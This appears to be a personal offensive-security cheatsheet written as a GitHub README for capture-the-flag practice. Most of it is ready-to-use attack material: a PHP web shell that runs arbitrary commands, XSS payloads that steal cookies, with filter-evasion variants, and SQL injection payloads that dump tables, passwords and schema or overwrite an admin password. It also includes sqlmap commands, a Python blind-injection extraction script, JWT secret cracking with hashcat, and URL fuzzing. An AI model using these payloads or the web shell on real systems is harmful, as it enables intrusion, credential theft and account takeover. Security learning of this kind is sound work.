# CyCheatsheet
# Useful Linux Commands:
### Find file name/type location
To find a file name location by just knowing **the file extention**
```
find . -type f -iname "*.pcap"
```
To find a file name location by just knowing **the name not the extention** 
```
find . -type f -iname "yourFileName"
```
To find a file name location by just knowing **part of the name** of the file
```
find . -type f -iname "*partOfTheFileName*"
```
### grep a location text you know
To grep or find a text or string from a specefic file
```
grep "whatever text you want" filename
```
To grep or find a text or string from multiple files 
```
grep -r "whatever text" /target/directory
```
**NOTE:** use ```-i``` switch to avoid upper/lower case issues

# Tools:
* sqlmap ----> perform automated SQL injection
* ffuf  -----> fuzzing the url to find hidden files
* hashcat  ---> brute-force attacks
* hash-identifier ----> give it a hashed password/string/whatever and it return possible hashes
# Known files to check:
```
robots.txt
.htaccess
.DS_Store
```
# PHP reverse-shell
This is very useful php code that will give UI to enter whatever commnd line you want check this link: `https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985`
```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```
# XSS:
* Reflected XSS means when you enter something you see it in return in the page
* PHP, Node.js, Flask, ASP.NET Chek there code of dealing with the user input query if it is not using any function of esacping or sanitization they are vulrenable
* Stored XSS means for example you go contact page and enter email and whatever then message so the message if not sanitized if will be stored then executed later

Those are the most common:
```
<script>alert("Hello")</script>
<script>alert(document.cookie)</script>
```
Also if it does not work you can use cyberChef to `URL encode` your XSS script and try it<br>
If the payload will fall between html tags we can simply do this:
```
<script>alert(document.cookie)</script>
```
If the payload is within html tag we have to colse the tag first by doing one of the two options:
```
><script>alert(document.cookie)</script>
"><script>alert(document.cookie)</script>
```
If the payload will be run in javascript script we may terminate the current script by doing this:
```
</script>
```
I it is within a sting in JS script we can end it by using `'` and `;` then execute whatever you want follwed by a comment `//`
```
';alert(document.cookie)//
```
Aweson resource various XSS attacks list or cheatsheet and it has also other resources: <br>
https://github.com/payloadbox/xss-payload-list <br>
Resource if there is restrections like the length of the payload: <br>
https://github.com/terjanq/Tiny-XSS-Payloads <br>
This cheatsheet is valuable for different filters:<br>
https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html <br>
For example this XSS `<IMG SRC="javascript:alert('XSS');">` can be written in multiple different ways:
```
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
```
There are multiple tricks to do to get bypass filters like using `horizental tap which is 0x9 in hex` , `new line which is 0xA in hex` or `cariege return which is 0xD in hex`
# SQLi:
Check this link: https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
```
admin' --

```
# Sqlmap commands:
* Use this command: 
```
sqlmap -u http://Path/to/login --data="username=admin&password=admin" --level=5 --risk=3 --dbms=sqlite --technique=b --dump

```
* Sometimes the injectable page you need has to bypass the login page first for that we use `tamper` script see those usefel links:<br>
1- https://lucadidomenico.medium.com/how-to-write-custom-tamper-scripts-for-sqlmap-93927808809e <br>
2- Go to Task 7: Vulnerable Startup: Vulnerable Notes in tryHackMe:: https://tryhackme.com/r/room/sqlilab <br>
* OR yu can do it by using the `cookies` that you got if you already know how to login
# SQL injection: 
* Test if injectable by the common ' or 1=1 or whatever
* Check the what database is used by testefying the version usually
* Check if you can extract data from databse by 2 ways: <br>
1- Check when you login or whatever actin you do is it `reflected` in the page? the results I mean?
2- Check for `Flask session cookie` sometimes you login and the cookie which is encoded have the data reflected there see this link to decode:

MySQL: Comments:<br>
1- Pay attention to inlcude space wand some value after the "two-dash" comment: ' OR 1=1-- -<br>
because from MySQL perpescitve there must be something after the two-dashes to consider it a comment<br>

basic bypass example a username: 
```
a' or 1=1-- -       #For MySQL
```
To query the version of the Databasee we are using:
```
',nickName=@@version,email='                        # MySQL and MSSQL
',nickName=(SELECT banner FROM v$version),email='   # For Oracle
',nickName=sqlite_version(),email='                 # For SQLite
```
# SQL Injection: UNION based injection:
Always two rules to perform UNION Sql injection:<br>
1- Number of columns should be same in the injection query and original query <br>
2- The columns should be the same type<br>
If you dont know how many columns there are use this: (instead of null you can use numbers like 1,2,3 it will be much better)
```
' UNION SELECT null --
' UNION SELECT null, null --
' UNION SELECT null, null, null --
```
For exmaple if a website login form has username and password as SELECT we can dump a password like this:
```
' UNION SELECT 1, password from users-- -
```
but this will give us only one password, what about dumping all the password? group_concat() is the answer:
```
' UNION SELECT 1,group_concat(password) FROM users-- -
```
Sometimes even the website is secruing the quereys by `parameterizing` for example the username field when registering so it consider everything user eneters as string but this is vulrenablity: <br> 
because for example in the website it may shows data of the user and it shows them by permforming a query which should be `concatinating` a query with the username <br>:
See this query that will show the user's notes: `SELECT title, note FROM notes WHERE username = '" + username + "'`<br>
what if we want to dump all tables in the notes?<br>
```
' union select 1,group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%''
```
The above query will be concatinated along with original query and we got something like this: <br>
`SELECT title, note FROM notes WHERE username = '' union select 1,group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%'''`

# SqlLite
Valuable cheatsheet resource for SqlLite injection (also the references at the end have valuable reosurces): <br>
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md<br>

This is to know the version of the Database so if you got result then you know you are using that database, SqlLite in this case:
```
',nickName=sqlite_version(),email=' 
```
This is to check if the input filed is vulrenable: (if editing profile this should get the nickname and email with 'test' and hacked)
```
asd',nickName='test',email='hacked
```
This is to select and show all the tables available there: (change "nickname" and "email" to whatever input you have)
```
',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='
```
This is to get all the columns in a table: (Change "nickname", "email" to whatever input you have and "usertable" to whatever table you know) 
```
',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable'),email='
```
This is to extract all the data from the columns you got and know(change whatevr varibales you see here to your targeted ones):
```
',nickName=(SELECT group_concat(profileID || "," || name || "," || password || ":") from usertable),email='
```
This will update/modify/change the data in the database so you can update the data in your favour to login as admin for example in a password of your choice:
```
', password='008c70392e3abfbd0fa47bbc2ed96aa99bd49e159727fcba0f2e6abeb3a9d601' WHERE name='Admin'-- -
```
# SQL injection: Blind
Idea is to send a request and make the response as true or false like asking if the password of admin starts with letter 'a'<br>
We usually use substring to see if the char we are looking for is the same as the one in the password :<br>
    and as you see string is the password for example, starts is the position of the char we are looking fr, and length is length of substring that will be returned (if 1 it will check only that letter)<br>
    ``SUBSTR( string, <start>, <length>)``<br>
Here is the query to check for example for the password we want for the specfied user we have:
```
```
LIMIT is to retrive the Offset (from row) the limit (length of how many rows you need if) :<br>
`` LIMIT <OFFSET>, <LIMIT> ``<br>
This will get you 2 rows starting from row 0. If you changed 2 to 1 it will get you only one row which is the first row
```
SELECT password FROM users LIMIT 0,2
```
To find the length of the pssword you are looking for by asking the databse you can do it as follows: (change 37 to whatever value you expect)
```
admin' AND length((SELECT password from users where username='admin'))==37-- -
```
Now we can check the first char of the password if it is T like this: (this may have `issue` see below the query)
```
SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = 'T'
```
Maybe it will be treated or converted to lowercase letter so to avoid that we use CAST and put the hex representation by using the %x for lowercase or %X for uppercase: (X'54' is 'T')
```
admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)-- -
```

an alternative approach is to autmoate the proccess of gussing the password by using a script or by using SQLmap (`NOTE` this will cause traffic requests):
```
sqlmap -u http://Path/to/login --data="username=admin&password=admin" --level=5 --risk=3 --dbms=sqlite --technique=b --dump
```
Or see this python script but make sure to cchange the length:
```
#!/usr/bin/python3
import sys
import requests

import string


def send_p(url, query):
    payload = {"username": query, "password": "admin"}
    try:
        r = requests.post(url, data=payload, timeout=3)
    except requests.exceptions.ConnectTimeout:
        print("[!] ConnectionTimeout: Try to adjust the timeout time")
        sys.exit(1)
    return r.text


def main(addr):
    url = f"http://{addr}/challenge3/login"
    flag = ""
    password_len = 38
    # Not the most efficient way of doing it...
    for i in range(1, password_len):
        for c in string.ascii_lowercase + string.ascii_uppercase + string.digits + "{}":
            # Convert char to hex and remove "0x"
            h = hex(ord(c))[2:]
            query = "admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1)," \
                f"{i},1)=CAST(X'{h}' AS TEXT)--"

            resp = send_p(url, query)
            if not "Invalid" in resp:
                flag += c
                print(flag)
    print(f"[+] FLAG: {flag}")


if __name__ == "__main__":
    if len(sys.argv) == 1:
        print(f"Usage: {sys.argv[0]} MACHINE_IP:PORT")
        sys.exit(0)
    main(sys.argv[1])
```
# nmap:
This will get the version of the server running the website
```
nmap -sV <IP_Addrress> 
```
# JWT JSON Web Tokens:
1- Use this website to help you with the validating and changing the token:
https://jwt.io/
2- create a text file ex: jwt.txt and store the JWT token in it
3- Use hashcat tool and rockyou.txt wordlist to bruteforce the secret key:
```
hashcat -m 16500 -a 0 jwt.txt ../../../../../../../../usr/share/wordlists/rockyou.txt

```
4- You may install the "JWT editor" in your "Burp Suite" and try:
    - changing the token 
    - setting the Alg to "none" attack 

# Cookies
* See this website to decode a "Flask" website cookie: https://www.kirsle.net/wizards/flask-session.cgi 


# Fuzzing the URL path with worldlist
1- Use the Common.txt from SecList 
2- use ffuf tool
3-Use this command
```
ffuf -u "http://path/to/website/FUZZ" -w ../../../../common.txt
```
# 
```
```
# 
```
```
# 
```
```
# 
```
```
# 
```
```
# 
```
```
# 
```
```
# 
```
```
# 
```
```

